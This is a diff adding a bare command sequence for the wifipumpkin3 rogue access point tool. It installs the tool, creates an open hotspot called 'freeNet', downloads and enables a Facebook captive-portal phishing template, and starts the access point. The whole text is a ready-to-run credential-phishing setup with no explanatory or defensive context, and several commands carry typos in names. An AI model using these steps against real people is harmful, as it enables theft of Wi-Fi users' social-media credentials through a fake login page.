@@ -1,0 +1,31 @@
+git clone https://github.com/P0cL4bs/wifipumpkin3.git
+cd wifipumkin3
+bash install.sh  || ./install.sh
+ 
+
+sudo make install
+pip3 install -r requirements.txt
+
+sudo wifipumkin3
+
+wp3>ap
+wp3>set ssid freeNet
+wp3>set channel 10
+wpa3>set interface wlan0
+wp3>show
+wp3>use misc.extra_captiveflask
+
+wp3:ex..>download
+wp3:ex..>install facebook
+wp3:ex..>list
+wp3:ex..>options
+wp3:ex..>back
+
+wp3>ap
+wp3>set proxy cativeflask
+wp3>proxies
+wp3>set captiveflask facebook true
+wp3>proxies
+wp3>ap
+wp3>start
+wp3>stop
